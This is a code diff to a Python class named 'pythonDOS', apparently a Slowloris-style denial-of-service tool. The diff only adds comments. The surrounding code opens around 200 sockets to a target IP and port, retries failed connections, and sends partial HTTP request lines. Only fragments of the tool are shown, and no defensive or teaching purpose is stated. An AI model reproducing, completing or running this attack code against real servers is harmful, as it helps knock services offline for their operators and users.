@@ -5,7 +5,7 @@ import socket, random, time, sys
 # Class definition
 class pythonDOS():
 
-    # Class init function, initialize object
+    # Class init function, initialize object, use default values on the initialize to keep it simple on production
     def __init__(self, ip, port=80, socketsCount = 200):
         self._ip = ip
         self._port = port
@@ -15,6 +15,7 @@ class pythonDOS():
         ]
         self._sockets = [self.newSocket() for _ in range(socketsCount)]
 
+    # Function to create new sockets, each socket is a connection
     def newSocket(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,6 +30,7 @@ class pythonDOS():
             time.sleep(0.5)
             return self.newSocket()
 
+    # Create the message requested to target server
     def getMessage(self, message):
         return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
 
